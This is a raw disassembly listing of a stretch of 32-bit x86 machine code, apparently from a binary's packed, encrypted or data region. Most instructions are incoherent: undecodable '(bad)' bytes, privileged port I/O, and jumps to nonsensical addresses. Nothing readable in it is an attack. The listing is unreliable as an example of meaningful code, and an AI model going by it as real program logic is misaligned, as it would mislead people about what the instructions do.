  411b77:	imul   edx,esi,0xffffffcf
  411b7a:	push   eax
  411b7b:	retf   0x1f90
  411b7e:	cmp    al,0x84
  411b80:	jno    0x411b66
  411b82:	dec    BYTE PTR [esi-0x41a5810a]
  411b88:	mov    dl,0xc1
  411b8a:	(bad)  
  411b8b:	lods   al,BYTE PTR ds:[esi]
  411b8c:	shl    BYTE PTR [ebp+0x14d8b20d],0xbb
  411b93:	mov    ebp,0x55ba44fa
  411b98:	pop    ss
  411b99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b9a:	das    
  411b9b:	call   0xf50bf9e6
  411ba0:	push   esi
  411ba1:	mov    ds:0x15ec6858,al
  411ba6:	bound  edx,QWORD PTR [edi]
  411ba8:	sbb    edi,edx
  411baa:	push   0x51c4a029
  411baf:	mov    dl,0xfd
  411bb1:	mov    al,ds:0x295d0396
  411bb6:	lock sub ah,BYTE PTR [ecx-0x7af83b17]
  411bbd:	inc    ecx
  411bbe:	fidiv  DWORD PTR [ebp-0xd02bd6c]
  411bc4:	push   edx
  411bc5:	or     dh,al
  411bc7:	xchg   ebx,eax
  411bc8:	addr16 into 
  411bca:	ror    DWORD PTR [edx],cl
  411bcc:	pop    ebp
  411bcd:	outs   dx,DWORD PTR ds:[esi]
  411bce:	in     eax,0xb4
  411bd0:	push   cs
  411bd1:	stc    
  411bd2:	(bad)  
  411bd4:	push   eax
  411bd5:	xchg   esi,eax
  411bd6:	gs iret 
  411bd8:	and    eax,ebx
  411bda:	add    BYTE PTR [ebp+0x2d],cl
  411bdd:	mov    ch,0x5
  411bdf:	out    0x79,eax
  411be1:	mov    al,BYTE PTR fs:[ebx-0x1168965e]
  411be8:	stos   DWORD PTR es:[edi],eax
  411be9:	cmp    al,0xf9
  411beb:	int    0x7d
  411bed:	scas   al,BYTE PTR es:[edi]
  411bee:	adc    al,BYTE PTR [eax+eax*4-0x11]
  411bf2:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  411bf4:	pusha  
  411bf5:	mov    esi,0xd3f02ab6
  411bfa:	arpl   WORD PTR [edx+0x586a19b4],cx
  411c00:	pop    edx
  411c01:	cmc    
  411c02:	stos   DWORD PTR es:[edi],eax
  411c03:	gs sub ch,0x11
  411c07:	xchg   ecx,eax
  411c08:	daa    
  411c09:	inc    edi
  411c0a:	push   eax
  411c0b:	or     DWORD PTR [edx+edx*8+0x5f],0xd48c2d2e
  411c13:	jb     0x411bed
  411c15:	cmp    DWORD PTR [esi-0x56ce1b50],eax
  411c1b:	lods   al,BYTE PTR ds:[esi]
  411c1c:	loop   0x411ba9
  411c1e:	push   esp
  411c1f:	repnz mov ch,0x2e
  411c22:	cmp    al,0xa7
  411c24:	in     al,0xf2
  411c26:	dec    esi
  411c27:	inc    ecx
  411c28:	loop   0x411c2f
  411c2a:	ret    0xbdf2
  411c2d:	jmp    0x86e5:0xc1720514
  411c34:	sbb    esp,DWORD PTR [ebx+eax*4+0x58]
  411c38:	ficomp DWORD PTR [esi-0x2317e2ad]
  411c3e:	fs popa 
  411c40:	xchg   ebp,eax
  411c41:	sahf   
  411c42:	add    DWORD PTR [ebp-0x4c],0x4
  411c46:	push   edx
  411c47:	adc    dh,BYTE PTR [esi-0x40]
  411c4a:	hlt    
  411c4b:	inc    eax
  411c4c:	push   ebp
  411c4d:	aas    
  411c4e:	(bad)  
  411c50:	loope  0x411c93
  411c52:	adc    esp,edx
  411c54:	dec    ecx
  411c55:	repnz or BYTE PTR [edi-0x76805e33],al
  411c5c:	adc    DWORD PTR [esi+eiz*1-0x3ad58d00],esi
  411c63:	cdq    
  411c64:	push   ebx
  411c65:	pop    edi
  411c66:	push   ss
  411c67:	out    0x4,al
  411c69:	xor    BYTE PTR [ecx-0xdaf4e62],0xf6
  411c70:	sub    DWORD PTR [ebx],ebp
  411c72:	fcom   DWORD PTR [ebx+0x3eb5998e]
  411c78:	sbb    DWORD PTR [edx-0x18],0x28e52633
  411c7f:	push   esi
  411c80:	xchg   ebx,eax
  411c81:	sub    DWORD PTR [edx+eiz*2+0x483ef27c],ecx
  411c88:	fsub   st(5),st
  411c8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c8c:	cdq    
  411c8d:	popf   
  411c8e:	popa   
  411c8f:	test   DWORD PTR [eax],eax
  411c91:	out    0xf2,eax
  411c93:	test   eax,0x74034669
  411c98:	stc    
  411c99:	(bad)  
  411c9b:	and    eax,0x1a853d41
  411ca0:	xor    ecx,ecx
  411ca2:	stos   BYTE PTR es:[edi],al
  411ca3:	push   ds
  411ca4:	cmp    edx,DWORD PTR [edx-0x78]
  411ca7:	out    dx,eax
  411ca8:	xor    BYTE PTR [ebx],0x1f
  411cab:	aas    
  411cac:	scas   eax,DWORD PTR es:[edi]
  411cad:	mov    ebp,0x2e1d117a
  411cb2:	imul   ebp,DWORD PTR [eax-0x6b0e9fc6],0x8c0487ba
  411cbc:	scas   eax,DWORD PTR es:[edi]
  411cbd:	in     al,dx
  411cbe:	push   0xc3741b4
  411cc3:	push   ecx
  411cc4:	or     ebp,DWORD PTR [esi+0x6f]
  411cc7:	inc    esi
  411cc8:	imul   esi,DWORD PTR [eax+eiz*4],0xffffffe9
  411ccc:	inc    esp
  411ccd:	add    eax,0x8ec76278
  411cd2:	call   0xfe06afc
  411cd7:	mov    al,0xb0
  411cd9:	addr16 xchg edi,eax
  411cdb:	adc    al,0x1b
  411cdd:	mov    ebx,0x8b722402
  411ce2:	fwait
  411ce3:	xchg   esp,edi
  411ce5:	out    0xe3,eax
  411ce7:	pop    es
  411ce8:	cmp    DWORD PTR [eax-0x53],0x31780558
  411cef:	and    al,0x3c
  411cf1:	or     BYTE PTR [edx+0x70d47da2],bh
  411cf7:	cli    
  411cf8:	mov    ch,0x87
  411cfa:	adc    edx,DWORD PTR [ebp-0x43]
  411cfd:	aaa    
  411cfe:	das    
  411cff:	pop    esp
  411d00:	mov    dh,0xac
  411d02:	jecxz  0x411cae
  411d04:	stc    
  411d05:	xchg   ebp,eax
  411d06:	fs jl  0x411d53
  411d09:	hlt    
  411d0a:	test   DWORD PTR [eax-0x2e2af477],edi
  411d10:	push   esp
  411d11:	popf   
  411d12:	aad    0xac
  411d14:	push   ds
  411d15:	jp     0x411d08
  411d17:	data16 mov ds:0x2f232ea6,al
  411d1d:	cmp    BYTE PTR [esi+0x3e],0x68
  411d21:	int3   
  411d22:	adc    DWORD PTR [edx-0xb3d560],0xfffffff8
  411d29:	push   esi
  411d2a:	ins    BYTE PTR es:[edi],dx
  411d2b:	in     al,dx
  411d2c:	dec    eax
  411d2d:	rol    DWORD PTR [ecx],0x63
  411d30:	jb     0x411d07
  411d32:	(bad)  
  411d34:	pop    ds
  411d35:	js     0x411cd4
  411d37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d38:	xor    DWORD PTR [ebp+0x1b5031bb],edx
  411d3e:	das    
  411d3f:	dec    esp
  411d40:	sbb    ch,BYTE PTR [eax+0x604da01d]
  411d46:	cmp    dl,bl
  411d48:	mov    dh,BYTE PTR [ebp+0x37]
  411d4b:	push   ebp
  411d4c:	or     al,ah
  411d4e:	add    edx,0x46b7a632
  411d54:	sbb    al,0x7d
  411d56:	rol    ecx,1
  411d58:	mov    BYTE PTR [ebp-0x1e],ch
  411d5b:	imul   edx,DWORD PTR [esi+0x1d0a5849],0x272fe81d
  411d65:	sbb    bh,BYTE PTR [esi]
  411d67:	scas   al,BYTE PTR es:[edi]
  411d68:	dec    esp
  411d69:	into   
  411d6a:	push   esi
  411d6b:	out    0xfb,eax
  411d6d:	mov    eax,ds:0xf28ce021
  411d72:	mov    dh,0xdf
  411d74:	cmc    
  411d75:	sbb    BYTE PTR [edi],al
  411d77:	ds jle 0x411dd2
  411d7a:	lods   al,BYTE PTR ds:[esi]
  411d7b:	mov    WORD PTR [esi+0x37],ds
  411d7e:	mov    esp,0x83b0ba16
  411d83:	xor    eax,0xa557d5ec
  411d88:	and    bh,BYTE PTR [edi-0x79]
  411d8b:	sbb    eax,0xbb410462
  411d90:	aaa    
  411d91:	lock sub eax,0x7f4cc71d
  411d97:	jbe    0x411d4f
  411d99:	dec    eax
  411d9a:	inc    edi
  411d9b:	push   ds
  411d9c:	int3   
  411d9d:	repnz mov ah,0x73
  411da0:	or     DWORD PTR [ebp+eiz*4+0xbcffa93],edx
  411da7:	pop    ds
  411da8:	sub    DWORD PTR ds:0xaf47a5d1,eax
  411dae:	and    BYTE PTR [ecx],ch
  411db0:	jnp    0x411d5d
  411db2:	cmp    DWORD PTR [edi+0x5baf05f4],ecx
  411db8:	pop    ds
  411db9:	sbb    edx,ebp
  411dbb:	pop    edx
  411dbc:	(bad)  
  411dbd:	sbb    esp,DWORD PTR [eax-0x6b39a1fa]
  411dc3:	mov    ecx,0x4be1960
  411dc8:	mov    cl,0xd3
  411dca:	jge    0x411e2c
  411dcc:	retf   0x15c3
  411dcf:	imul   ebx,DWORD PTR [esi+0x2a],0x9e60e279
  411dd6:	in     al,0x49
  411dd8:	popf   
  411dd9:	cmp    al,0xae
  411ddb:	jg     0x411e24
  411ddd:	ja     0x411dde
  411ddf:	dec    ecx
  411de0:	fimul  DWORD PTR gs:[edi-0x14]
  411de4:	mov    al,ds:0x3a516e39
  411de9:	jo     0x411e59
  411deb:	rcr    BYTE PTR [ebx-0x5d304c2f],cl
  411df1:	mov    dh,BYTE PTR [ecx+ebx*1+0x67]
  411df5:	push   edi
  411df6:	in     eax,0x98
  411df8:	popf   
  411df9:	ins    DWORD PTR es:[edi],dx
  411dfa:	push   ds
  411dfb:	pop    ecx
  411dfc:	dec    esi
  411dfd:	and    eax,0xf041564d
  411e02:	ja     0x411d8b
  411e04:	and    BYTE PTR [eax+ebx*4],0x1f
  411e08:	frstor [edx]
  411e0a:	enter  0xa0b3,0xcb
  411e0e:	mov    ah,0x23
  411e10:	jmp    FWORD PTR [edx-0x35]
  411e13:	lock mov edx,0x33dd55e7
  411e19:	pop    ebx
  411e1a:	int    0x39
  411e1c:	xchg   DWORD PTR [edx+0x3b],esi
  411e1f:	in     eax,0x6e
  411e21:	pop    ecx
  411e22:	cmc    
  411e23:	addr16 cmp eax,edi
  411e26:	push   ds
  411e27:	rcl    edx,0x86
  411e2a:	xlat   BYTE PTR ds:[ebx]
  411e2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e2c:	add    edx,ecx
  411e2e:	dec    esi
  411e2f:	cmp    ebx,0xc52ea7
  411e35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e36:	adc    edi,DWORD PTR [esi+0x6e]
  411e39:	jg     0x411de2
  411e3b:	and    eax,0xc1225cfa
  411e40:	cdq    
  411e41:	mov    al,ds:0x5f97df40
  411e46:	iret   
  411e47:	pop    esi
  411e48:	push   es
  411e49:	js     0x411e17
  411e4b:	and    al,0xfb
  411e4d:	std    
  411e4e:	and    al,0xdb
  411e50:	loop   0x411dea
  411e52:	xchg   esi,eax
  411e53:	out    0x97,al
  411e55:	cwde   
  411e56:	jl     0x411e82
  411e58:	in     al,0x33
  411e5a:	stos   DWORD PTR es:[edi],eax
  411e5b:	xor    BYTE PTR [ecx+0x47],dl
  411e5e:	mov    ah,0x67
  411e60:	fist   DWORD PTR [eax+0x31efdb0a]
  411e66:	enter  0xeee4,0x98
  411e6a:	imul   esi,DWORD PTR [ebp-0x2b],0x3
  411e6e:	loope  0x411e84
  411e70:	mov    edi,0x9ea3b6d9
  411e75:	test   eax,0xf2001eec
  411e7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e7b:	pop    ecx
  411e7c:	cdq    
  411e7d:	(bad)  
  411e7e:	in     al,dx
  411e7f:	cmp    ebp,edi
  411e81:	cmp    eax,0xfd5d53a4
  411e86:	(bad)  
  411e88:	jne    0x411e38
  411e8a:	ror    BYTE PTR [esi-0x56],cl
  411e8d:	jb     0x411edf
  411e8f:	inc    eax
  411e90:	push   ebx
  411e91:	dec    ebp
  411e92:	(bad)  [ebx]
  411e94:	or     eax,0x9950297b
  411e99:	sbb    eax,0x1e8104e4
  411e9e:	nop
  411e9f:	imul   esi,DWORD PTR [ebp-0x2eac4aa6],0xcf4f47ff
  411ea9:	pop    ss
  411eaa:	jo     0x411eaa
  411eac:	lods   eax,DWORD PTR ds:[esi]
  411ead:	fwait
  411eae:	repnz int 0x6
  411eb1:	jl     0x411f07
  411eb3:	ds js  0x411ef4
  411eb6:	pop    ss
  411eb7:	dec    ecx
  411eb8:	fstp   DWORD PTR ds:0x44ec2b85
  411ebe:	nop
  411ebf:	push   ebx
  411ec0:	rcl    eax,0x39
  411ec3:	cmc    
  411ec4:	rcr    DWORD PTR [ecx],1
  411ec6:	jg     0x411f2d
  411ec8:	(bad)  
  411ec9:	jno    0x411f3f
  411ecb:	push   cs
  411ecc:	mov    edi,0xe05f6ebe
  411ed1:	enter  0xfa12,0x30
  411ed5:	sub    eax,0x371d81fd
  411eda:	mov    ebx,0x9f9c81a4
  411edf:	jbe    0x411f20
  411ee1:	jecxz  0x411f55
  411ee3:	ins    BYTE PTR es:[edi],dx
  411ee4:	out    0x16,al
  411ee6:	fdivr  DWORD PTR [ebx+0x4bd0cbd9]
  411eec:	into   
  411eed:	je     0x411f00
  411eef:	rcl    ah,cl
  411ef1:	out    dx,eax
  411ef2:	mov    ah,0xee
  411ef4:	outs   dx,DWORD PTR ds:[esi]
  411ef5:	add    BYTE PTR [eax-0x30],dl
  411ef8:	in     eax,dx
  411ef9:	das    
  411efa:	xor    BYTE PTR [esi],0x68
  411efd:	fdivr  DWORD PTR [ecx+0x237e6f90]
  411f03:	sub    eax,0xd103e85e
  411f08:	les    ecx,FWORD PTR [esi+0x65bda729]
  411f0e:	call   0xa55c:0x282762e
  411f15:	mov    ebx,esi
  411f17:	cmp    al,0x61
  411f19:	add    al,0x2d
  411f1b:	or     al,0xa8
  411f1d:	mov    al,0x47
  411f1f:	pop    ss
  411f20:	xchg   ecx,eax
  411f21:	out    dx,al
  411f22:	pop    es
  411f23:	daa    
  411f24:	frstor [edi+0x70]
  411f27:	dec    edx
  411f28:	and    BYTE PTR [esi-0x7775498a],0x8f
  411f2f:	push   0x4d44366b
  411f34:	aam    0x38
  411f36:	loope  0x411f3f
  411f38:	mov    dl,0xf3
  411f3a:	sub    esi,DWORD PTR [edx+0x67359b03]
  411f40:	dec    edx
  411f41:	loope  0x411f92
  411f43:	xchg   esi,ecx
  411f45:	in     al,0x84
  411f47:	in     al,0x22
  411f49:	inc    ebp
  411f4a:	mov    ah,BYTE PTR [esi]
  411f4c:	std    
  411f4d:	xor    eax,0x4349142e
  411f52:	adc    dl,BYTE PTR [ecx]
  411f54:	and    DWORD PTR [ebp-0xf829d7e],0x2a
  411f5b:	or     DWORD PTR [ebx],ebp
  411f5d:	leave  
  411f5e:	jle    0x411ee1
  411f60:	mov    BYTE PTR [esi-0x9],ah
  411f63:	mov    WORD PTR [esi+0x6fe32227],ds
  411f69:	nop
  411f6a:	test   al,0x6c
  411f6c:	test   DWORD PTR [esi-0x72],ecx
  411f6f:	and    al,0xfa
  411f71:	out    dx,eax
  411f72:	loopne 0x411fad
  411f74:	add    eax,0x3a07ec96
  411f79:	sbb    dh,BYTE PTR [edi+ecx*1+0x5fd73acb]
  411f80:	fidivr DWORD PTR [ebx+ebp*1-0x46]
  411f84:	outs   dx,BYTE PTR cs:[esi]
  411f86:	cmp    BYTE PTR [esi-0x654b97d8],ah
  411f8c:	icebp  
  411f8d:	ret    0xa26a
  411f90:	or     al,BYTE PTR [ebp+0xcf2d5ba]
  411f96:	scas   eax,DWORD PTR es:[edi]
  411f97:	ds in  al,0x79
  411f9a:	fidivr DWORD PTR [si+0xb]
  411f9e:	mov    dl,0x6f
  411fa0:	scas   al,BYTE PTR es:[edi]
  411fa1:	xor    edx,DWORD PTR [edi-0x5a9efdac]
  411fa7:	push   ebp
  411fa8:	xor    eax,0xd57b05b2
  411fad:	or     eax,0x493a6423
  411fb2:	mov    eax,ds:0xb2f452b6
  411fb7:	jmp    0xe0776192
  411fbc:	je     0x411fa3
  411fbe:	add    BYTE PTR [edx+0x71],ch
  411fc1:	mov    bl,0x30
  411fc3:	mov    eax,0x42d085a6
  411fc8:	cdq    
  411fc9:	jmp    0xfd15ff2b
  411fce:	les    edi,FWORD PTR [ebx+eiz*1+0xb6ef8f4]
  411fd5:	pop    esi
  411fd6:	sbb    esi,esp
  411fd8:	mov    bl,0xcb
  411fda:	add    eax,DWORD PTR [esp+eax*4]
  411fdd:	icebp  
  411fde:	mov    ds:0xf584f824,al
  411fe3:	fisubr DWORD PTR ds:0x9904febf
  411fe9:	xor    DWORD PTR [esi],esp
  411feb:	add    eax,0x9730039
  411ff0:	repz mov al,0xdc
  411ff3:	or     cl,BYTE PTR [edi]
  411ff5:	scas   al,BYTE PTR es:[edi]
  411ff6:	add    eax,0xf3b95a21
  411ffb:	gs nop
  411ffd:	mov    ds:0xd5ed2fd6,eax
  412002:	xor    BYTE PTR [edi],ah
  412004:	inc    eax
  412005:	sub    eax,0x19b8b4a3
  41200a:	cmp    eax,0xb6dd18cf
  41200f:	retf   
  412010:	xchg   edi,eax
  412011:	out    dx,eax
  412012:	repnz and BYTE PTR ds:0xd0bf5cb6,al
  412019:	ror    dl,cl
  41201b:	and    ch,BYTE PTR ds:0x683ee6c6
  412021:	cmp    bh,BYTE PTR [ecx+edi*2]
  412024:	call   0x3fdf4700
  412029:	jmp    0xe00d90f5
  41202e:	cmp    DWORD PTR [bx],eax
  412031:	cmp    DWORD PTR [si],esi
  412034:	xchg   esp,eax
  412035:	les    edx,FWORD PTR [edx+eax*1-0x2edfac43]
  41203c:	push   edx
  41203d:	out    dx,eax
  41203e:	mov    esi,0x37f79421
  412043:	call   0x30fc26f6
  412048:	push   eax
  412049:	add    DWORD PTR [ebx-0x31],ecx
  41204c:	mov    ?,WORD PTR ds:0x990f03e1
  412052:	lods   al,BYTE PTR ds:[esi]
  412053:	xchg   edx,eax
  412054:	out    0x5f,al
  412056:	repz cwde 
  412058:	xchg   edi,eax
  412059:	or     bh,bh
  41205b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41205c:	jbe    0x411ffb
  41205e:	pop    ebx
  41205f:	stos   DWORD PTR es:[edi],eax
  412060:	jp     0x412085
  412062:	dec    ebx
  412063:	test   eax,eax
  412065:	aad    0x5b
  412067:	aas    
  412068:	sub    eax,0xf52ceff6
  41206d:	sub    al,0x2c
  41206f:	inc    esi
  412070:	or     esp,edx
  412072:	js     0x41203f
  412074:	fnsave [edx+0x41]
  412077:	or     dl,dh
  412079:	inc    ebp
  41207a:	cmp    bh,BYTE PTR ds:0x1c05ed21
  412080:	out    dx,eax
  412081:	ret    
  412082:	dec    ebp
  412083:	jb     0x412059
  412085:	rol    DWORD PTR [eax],0x3a
  412088:	or     BYTE PTR [ecx-0x48ea5ecf],al
  41208e:	push   0x66
  412090:	das    
  412091:	push   0x2f
  412093:	repz arpl WORD PTR [esi+0x6b],bx
  412097:	(bad)  
  412098:	cmp    BYTE PTR ds:0x2ea29ee5,cl
  41209e:	sbb    cl,ah
  4120a0:	(bad)  
  4120a1:	and    BYTE PTR [ebp+0x1c],dh
  4120a4:	inc    esp
  4120a5:	outs   dx,BYTE PTR ds:[esi]
  4120a6:	scas   eax,DWORD PTR es:[edi]
  4120a7:	cmp    BYTE PTR [edx],ch
  4120a9:	pop    ebp
  4120aa:	mov    DWORD PTR [esi+0x6b],eax
  4120ad:	xchg   BYTE PTR [ebp-0x54],al
  4120b0:	pop    esp
  4120b1:	add    bl,BYTE PTR cs:[esi-0x26a8f24]
  4120b8:	sbb    DWORD PTR [ebx+0x20],eax
  4120bb:	sbb    BYTE PTR [eax],dh
  4120bd:	or     ebx,eax
  4120bf:	or     al,0x53
  4120c1:	rcr    ebp,0x1b
  4120c4:	xchg   edi,eax
  4120c5:	fiadd  DWORD PTR [ebp+edi*8-0x343ecedc]
  4120cc:	ds jno 0x41212c
  4120cf:	jo     0x412111
  4120d1:	cdq    
  4120d2:	fdiv   QWORD PTR [esi+0x4c]
  4120d5:	popf   
  4120d6:	icebp  
  4120d7:	in     eax,0xf3
  4120d9:	add    eax,DWORD PTR [eax-0x2f962ca5]
  4120df:	and    BYTE PTR [eax-0x17],ch
  4120e2:	mov    eax,ds:0x71b27530
  4120e7:	jmp    0x24f2:0x1f370550
  4120ee:	xchg   ecx,eax
  4120ef:	retf   0x91fc
  4120f2:	pop    ecx
  4120f3:	xor    al,0xaf
  4120f5:	add    DWORD PTR [ebp+0x3a5d4573],esp
  4120fb:	hlt    
  4120fc:	xchg   ecx,eax
  4120fd:	inc    edi
  4120fe:	and    DWORD PTR [ecx+eax*8+0x6f],ebx
  412102:	jge    0x412126
  412104:	cs inc edi
  412106:	and    ecx,esi
  412108:	push   ebx
  412109:	pop    esi
  41210a:	cwde   
  41210b:	mov    ds:0xf5a8858e,al
  412110:	mov    al,ds:0xfb0bbb01
  412115:	xor    DWORD PTR [esi+0x3a5383ec],eax
  41211b:	mov    ecx,0x3fca8e21
  412120:	ds inc eax
  412122:	hlt    
  412123:	and    al,bh
  412125:	mov    WORD PTR [edx+0x27],?
  412128:	mov    eax,ds:0x2bf22790
  41212d:	fiadd  DWORD PTR [edx]
  41212f:	jns    0x4120c2
  412131:	dec    esi
  412132:	std    
  412133:	add    dh,bh
  412135:	inc    ebx
  412136:	mov    edi,0x3cfe69af
  41213b:	(bad)  
  41213c:	leave  
  41213d:	mov    eax,0x92294a72
  412142:	cmp    al,0xe6
  412144:	add    bh,0x16
  412147:	test   ebx,edi
  412149:	shr    DWORD PTR [edx-0x31b01c4f],0xb3
  412150:	sub    cl,ah
  412152:	ds dec esp
  412154:	xchg   esi,eax
  412155:	push   0xffffffc7
  412157:	sbb    DWORD PTR [ecx+0x50],edx
  41215a:	int    0x33
  41215c:	push   ss
  41215d:	mov    al,ds:0xf60d9ad9
  412162:	push   eax
  412163:	sub    dl,0xb4
  412166:	(bad)  
  412167:	jae    0x412133
  412169:	retf   0x464
  41216c:	and    eax,0xdfc03905
  412171:	push   esp
  412172:	dec    eax
  412173:	lods   al,BYTE PTR ds:[esi]
  412174:	imul   ch
  412176:	xchg   DWORD PTR [edx],eax
  412178:	sar    DWORD PTR [esp+ebp*4-0x7ff1bba0],0xbb
  412180:	jb     0x412200
  412182:	adc    al,0xc2
  412184:	adc    BYTE PTR [ebp-0x664bb3c1],bl
  41218a:	cs call 0x5dc3a0cc
  412190:	addr16 pop ss
  412192:	xor    al,0x48
  412194:	sub    eax,0xf01b19d9
  412199:	test   al,0xf0
  41219b:	enter  0x5bd7,0x50
  41219f:	rcr    BYTE PTR [edi],cl
  4121a1:	js     0x41218b
  4121a3:	mov    dh,0xd4
  4121a5:	sbb    eax,0xd9e40e40
  4121aa:	pop    ebp
  4121ab:	loope  0x4121d6
  4121ad:	jmp    0x412189
  4121af:	ret    0xacfb
  4121b2:	and    DWORD PTR [edi],0x144a87da
  4121b8:	js     0x412146
  4121ba:	dec    edi
  4121bb:	ficom  DWORD PTR [esi-0x54bb9375]
  4121c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121c2:	jnp    0x41216e
  4121c4:	cmp    DWORD PTR [edx-0x7d],esp
  4121c7:	push   edi
  4121c8:	jno    0x41219c
  4121ca:	mov    dl,0x3d
  4121cc:	or     DWORD PTR [edi-0x47ef81d7],edi
  4121d2:	jl     0x412213
  4121d4:	jne    0x4121df
  4121d6:	dec    edi
  4121d7:	push   0xfffffff0
  4121d9:	scas   al,BYTE PTR es:[edi]
  4121da:	mov    ecx,DWORD PTR [esi+0x46]
  4121dd:	mov    al,ds:0x71e82aec
  4121e2:	pusha  
  4121e3:	pop    ds
  4121e4:	xchg   ecx,eax
  4121e5:	std    
  4121e6:	sbb    esp,DWORD PTR [edi+0x6d88795e]
  4121ec:	xchg   DWORD PTR [edi],esp
  4121ee:	inc    esi
  4121ef:	sbb    eax,0x7a33d37a
  4121f4:	fs sbb al,0xd3
  4121f7:	inc    esp
  4121f8:	xlat   BYTE PTR ds:[ebx]
  4121f9:	xor    dl,BYTE PTR [edx]
  4121fb:	js     0x412230
  4121fd:	loopne 0x4121d4
  4121ff:	into   
  412200:	inc    esp
  412201:	aas    
  412202:	inc    ecx
  412203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412204:	add    al,0xe7
  412206:	pop    esi
  412207:	mov    dl,BYTE PTR [edi]
  412209:	xor    DWORD PTR [esi-0x179cbcbb],ebp
  41220f:	pop    esi
  412210:	sub    BYTE PTR [ecx-0x6d],cl
  412213:	mov    dl,0xd1
  412215:	pop    eax
  412216:	ret    0x387e
  412219:	stos   DWORD PTR es:[edi],eax
  41221a:	and    bl,ch
  41221c:	inc    eax
  41221d:	or     ch,dh
  41221f:	push   ds
  412220:	retf   
  412221:	sub    al,0xb8
  412223:	mov    ds:0x3e9d2ba3,eax
  412228:	xchg   edi,eax
  412229:	mov    ebp,0xc4b4c9a2
  41222e:	push   eax
  41222f:	pop    ebx
  412230:	xchg   ebx,eax
  412231:	mov    dh,dl
  412233:	mov    BYTE PTR [ebx+edx*2-0x78366e28],bh
  41223a:	xchg   esp,eax
  41223b:	mov    ecx,0xb04492b9
  412240:	cmc    
  412241:	ja     0x41227e
  412243:	dec    esp
  412244:	iret   
  412245:	xor    esp,DWORD PTR [edi+eiz*2]
  412248:	shl    BYTE PTR [ecx-0x7b],cl
  41224b:	pop    edi
  41224c:	cmp    eax,0x8745e143
  412251:	mov    eax,0xadb2d935
  412256:	mov    ebp,0x79aa86c7
  41225b:	rol    BYTE PTR [edx+0x33671768],1
  412261:	leave  
  412262:	sbb    DWORD PTR [esi-0x782e076d],ebx
  412268:	inc    eax
  412269:	stc    
  41226a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41226b:	cs leave 
  41226d:	sub    al,0x95
  41226f:	(bad)  
  412270:	and    bh,bh
  412272:	jo     0x4122b6
  412274:	mov    dl,0xda
  412276:	jge    0x4122ca
  412278:	push   ebx
  412279:	dec    eax
  41227a:	ret    
  41227b:	gs push es
  41227d:	add    BYTE PTR [edx],dh
  41227f:	xchg   esp,eax
  412281:	aad    0xe9
  412283:	pop    eax
  412284:	sbb    BYTE PTR [ebp+0x3f583e39],dl
  41228a:	imul   eax,DWORD PTR [ebp+0x14],0xcbf0c51f
  412291:	jmp    DWORD PTR [ebx+ebp*2]
  412294:	pop    ebx
  412295:	or     ebp,DWORD PTR [esi+0x20]
  412298:	es mov eax,0xd3cd5ec9
  41229e:	jmp    0x6940:0x1e07118b
  4122a5:	fcmovnu st,st(3)
  4122a7:	mov    cl,0xe0
  4122a9:	cmp    eax,0x1e6236b
  4122ae:	lods   eax,DWORD PTR ds:[esi]
  4122af:	mov    dh,0x62
  4122b1:	test   eax,0xc2041b50
  4122b6:	lods   eax,DWORD PTR ds:[esi]
  4122b7:	mov    al,ds:0xcbc7000c
  4122bc:	pop    ecx
  4122bd:	add    ebx,DWORD PTR [esi+0x15617918]
  4122c3:	scas   eax,DWORD PTR es:[edi]
  4122c4:	pushf  
  4122c5:	pop    ebx
  4122c6:	(bad)  
  4122c7:	test   eax,0x113a2367
  4122cc:	jno    0x412290
  4122ce:	scas   al,BYTE PTR es:[edi]
  4122cf:	aaa    
  4122d0:	cmp    al,0xfb
  4122d2:	(bad)  
  4122d3:	adc    edi,ecx
  4122d5:	imul   eax,DWORD PTR [edx+0x6dc5a9a],0x74
  4122dc:	fwait
  4122dd:	es jmp 0x2259a802
  4122e3:	mov    edx,0x10257781
  4122e8:	enter  0x27a8,0xfa
  4122ec:	jmp    DWORD PTR [eax+ecx*2-0x7]
  4122f0:	sub    eax,0x3662794
  4122f5:	fiadd  WORD PTR [eax+0xb4c060b]
  4122fb:	lods   eax,DWORD PTR ds:[esi]
  4122fc:	and    BYTE PTR [ecx],ah
  4122fe:	and    dh,BYTE PTR ds:0x33c6d98d
  412304:	cdq    
  412305:	and    DWORD PTR [edx+0x28],edi
  412308:	scas   eax,DWORD PTR es:[edi]
  412309:	clc    
  41230a:	jmp    0x4122b0
  41230c:	scas   al,BYTE PTR es:[edi]
  41230d:	cmp    esp,ebx
  41230f:	jg     0x412342
  412311:	pop    ecx
  412312:	outs   dx,DWORD PTR ds:[esi]
  412313:	es out dx,eax
  412315:	iret   
  412316:	aaa    
  412317:	std    
  412318:	dec    ebx
  412319:	inc    esi
  41231a:	and    BYTE PTR [ecx-0x4845b7d],cl
  412320:	inc    esp
  412321:	stos   WORD PTR es:[edi],ax
  412323:	xor    eax,0x58d35a86
  412328:	cmp    BYTE PTR [edi],0xc7
  41232b:	(bad)  
  41232d:	mov    bl,0x7a
  41232f:	cld    
  412330:	pushf  
  412331:	imul   ebx,DWORD PTR [edx-0x20],0xebde9c30
  412338:	div    DWORD PTR [edx-0x68]
  41233b:	rcl    edi,cl
  41233d:	mov    ch,0x2b
  41233f:	popa   
  412340:	mov    al,0x4e
  412342:	test   al,0x5e
  412344:	add    dl,al
  412346:	test   edx,eax
  412348:	sti    
  412349:	pop    ss
  41234a:	dec    ebp
  41234b:	mov    ch,0xcb
  41234d:	icebp  
  41234e:	rol    DWORD PTR [ecx-0x440c5ac5],cl
  412354:	fistp  WORD PTR [ebx+0x45]
  412357:	ja     0x4123b8
  412359:	popa   
  41235a:	cmp    DWORD PTR [ebx+0x4f34951f],ebp
  412360:	or     bh,BYTE PTR [eax-0x3d]
  412363:	sub    BYTE PTR [ecx-0x1f224971],0x4e
  41236a:	std    
  41236b:	rol    DWORD PTR [edx+0x7d22550c],cl
